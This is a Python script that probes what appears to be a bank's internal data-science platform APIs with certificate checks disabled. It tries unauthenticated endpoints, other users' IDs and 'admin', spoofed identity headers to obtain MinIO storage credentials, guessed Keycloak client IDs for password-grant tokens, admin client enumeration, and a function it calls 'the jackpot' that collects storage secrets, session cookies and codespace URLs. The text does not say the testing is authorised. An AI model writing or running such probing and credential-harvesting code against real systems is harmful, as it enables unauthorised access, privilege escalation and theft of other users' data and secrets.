import requests, json
requests.packages.urllib3.disable_warnings()

project_base = "https://project.studio.sparrow.cloud.echonet.net.intra"
offer_base   = "https://offer.studio.sparrow.cloud.echonet.net.intra"

# Your user ID from the environment
my_uid = "c91364"

pa_endpoints = [
    # Project API - no auth required
    (project_base, "GET",    "/pa/projects-with-buckets",        {}),
    (project_base, "GET",    "/pa/users_info",                   {}),
    (project_base, "GET",    f"/pa/access/{my_uid}",             {}),
    (project_base, "GET",    "/pa/portfolios/kpi",               {}),
    (project_base, "GET",    "/healthcheck",                     {}),

    # Try other user IDs we've seen
    (project_base, "GET",    "/pa/access/andrew.murphy",         {}),

    # Offer API - no auth required
    (offer_base,   "GET",    "/pa/offers",                       {}),
    (offer_base,   "GET",    "/pa/features",                     {}),
    (offer_base,   "GET",    f"/pa/feature_subscriptions/{my_uid}/features",    {}),
    (offer_base,   "GET",    f"/pa/feature_subscriptions/{my_uid}/subscriptions", {}),
    (offer_base,   "GET",    f"/pa/subscriptions/{my_uid}/offers/{my_uid}",     {}),
]

for base, method, path, params in pa_endpoints:
    url = f"{base}{path}"
    try:
        r = requests.request(method, url, params=params,
                            verify=False, timeout=5)
        print(f"\n{method} {path}")
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  *** HIT! ***")
            print(f"  {r.text[:500]}")
        elif r.status_code == 422:
            print(f"  Validation error: {r.text[:200]}")
        else:
            print(f"  {r.text[:100]}")
    except Exception as e:
        print(f"  Error: {e}")
        
gatekeeper = "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra"

# Try with your user ID and others
for uid in ["c91364", "andrew.murphy", "admin", "68d0190054c04a09aba8d6ee11f88e36"]:
    r = requests.get(
        f"{gatekeeper}/authorize",
        params={"user_id": uid},
        verify=False, timeout=5
    )
    print(f"/authorize?user_id={uid}: {r.status_code}")
    if r.status_code == 200:
        print(f"  *** {r.text[:300]}")
        
        
# This returns the MinIO credentials for the current user
# Try with various auth approaches
for auth_header in [
    {},  # no auth
    {"Authorization": f"Bearer {my_jwt}"},
    {"X-User-Id": "c91364"},
    {"X-BNP-UID": "c91364"},
]:
    r = requests.get(
        f"{project_base}/users/me/storage-credentials",
        headers=auth_header,
        verify=False, timeout=5
    )
    print(f"{list(auth_header.keys())}: {r.status_code} {r.text[:100]}")
    
    
### test JWT token access

# Your Keycloak UUID from the JWT
keycloak_id = "68d0190054c04a09aba8d6ee11f88e36"
bnp_uid     = "c91364"

for uid in [keycloak_id, bnp_uid, "andrew.murphy"]:
    r = requests.get(
        f"{project_base}/pa/access/{uid}",
        verify=False, timeout=5
    )
    print(f"/pa/access/{uid}: {r.status_code} {r.text[:200]}")

### PART 2

## try getting token using UID + password


# Keycloak token endpoint
token_url = "https://auth.sparrow.cloud.echonet/auth/realms/ap26882-prod/protocol/openid-connect/token"

# Try password grant with your platform credentials
# The client_id is likely the application name
for client_id in ["sparrow", "sparrow-studio", "platform", 
                  "gatekeeper", "front", "datalab", 
                  "sparrow-front", "public"]:
    r = requests.post(
        token_url,
        data={
            "grant_type":  "password",
            "client_id":   client_id,
            "username":    "c91364",        # your BNP UID
            "password":    "YOUR_PASSWORD", # your actual platform password
            "scope":       "openid",
        },
        verify=False,
        timeout=5
    )
    print(f"client_id={client_id}: {r.status_code}")
    if r.status_code == 200:
        token_data = r.json()
        print(f"  *** GOT TOKEN! ***")
        print(f"  access_token: {token_data['access_token'][:80]}...")
        print(f"  expires_in:   {token_data.get('expires_in')}s")
        break
    else:
        err = r.json().get('error_description', r.text[:100])
        print(f"  {err}")
        
        
base = "https://auth.sparrow.cloud.echonet"
realm = "ap26882-prod"

# Well-known endpoint reveals everything about the realm
r = requests.get(
    f"{base}/auth/realms/{realm}/.well-known/openid-configuration",
    verify=False, timeout=5
)
print(f"Well-known: {r.status_code}")
if r.status_code == 200:
    config = r.json()
    print(json.dumps(config, indent=2))

# Also get realm public key — useful for token verification
r = requests.get(
    f"{base}/auth/realms/{realm}",
    verify=False, timeout=5
)
print(f"\nRealm info: {r.status_code}")
if r.status_code == 200:
    print(r.json())

# Try to enumerate clients (usually restricted)
r = requests.get(
    f"{base}/auth/admin/realms/{realm}/clients",
    verify=False, timeout=5
)
print(f"\nClients (admin): {r.status_code} {r.text[:100]}")


def get_all_with_token(access_token):
    h = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json"
    }
    
    bases = {
        "api":         "https://api.studio.sparrow.cloud.echonet.net.intra",
        "project":     "https://project.studio.sparrow.cloud.echonet.net.intra",
        "offer":       "https://offer.studio.sparrow.cloud.echonet.net.intra",
        "gatekeeper":  "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra",
        "wheelbuilder":"https://wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
    }

    # ============================================================
    # MinIO credentials — THIS is the jackpot
    # Returns {"access_key": "...", "access_secret": "..."}
    # ============================================================
    print("\n=== MINIO CREDENTIALS ===")
    r = requests.get(
        f"{bases['project']}/users/me/storage-credentials",
        headers=h, verify=False
    )
    print(f"Status: {r.status_code}")
    print(r.text)  # access_key + access_secret

    # ============================================================
    # Who am I — get your full profile
    # ============================================================
    print("\n=== MY PROFILE ===")
    r = requests.get(f"{bases['project']}/users/me", headers=h, verify=False)
    print(r.text)

    # ============================================================
    # All my codespaces — reveals other pod URLs
    # ============================================================
    print("\n=== MY CODESPACES ===")
    r = requests.get(f"{bases['api']}/codespaces", headers=h, verify=False)
    print(r.text)

    # ============================================================
    # Gatekeeper cookie — platform session token
    # ============================================================
    print("\n=== PLATFORM COOKIE ===")
    r = requests.get(f"{bases['gatekeeper']}/cookie", headers=h, verify=False)
    print(r.text)
    print(f"Set-Cookie: {r.headers.get('Set-Cookie', 'none')}")

    # ============================================================
    # Start a codespace with elevated offer
    # ============================================================
    print("\n=== AVAILABLE OFFERS ===")
    r = requests.get(
        f"{bases['offer']}/subscriptions/me/offers",
        headers=h, verify=False
    )
    print(r.text[:500])

    # ============================================================
    # My projects + their bucket names
    # ============================================================
    print("\n=== MY PROJECTS + BUCKETS ===")
    r = requests.post(
        f"{bases['project']}/projects/filter",
        headers=h,
        json={"page": 1, "page_size": 20},
        verify=False
    )
    data = r.json()
    for proj in data.get("items", []):
        print(f"  {proj['name']:40} bucket={proj.get('bucket_name','?')}")
        
        
        
gatekeeper = "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra"

# Try your keycloak UUID (from the JWT we decoded earlier)
keycloak_uuid = "68d0190054c04a09aba8d6ee11f88e36"
bnp_uid = "c91364"

for uid in [keycloak_uuid, bnp_uid, "admin"]:
    r = requests.get(
        f"{gatekeeper}/authorize",
        params={"user_id": uid},
        verify=False, timeout=5,
        allow_redirects=False
    )
    print(f"user_id={uid}: {r.status_code}")
    print(f"  Body: {r.text[:200]}")
    print(f"  Location: {r.headers.get('Location', '')}")
    print(f"  Set-Cookie: {r.headers.get('Set-Cookie', '')}")
    
    

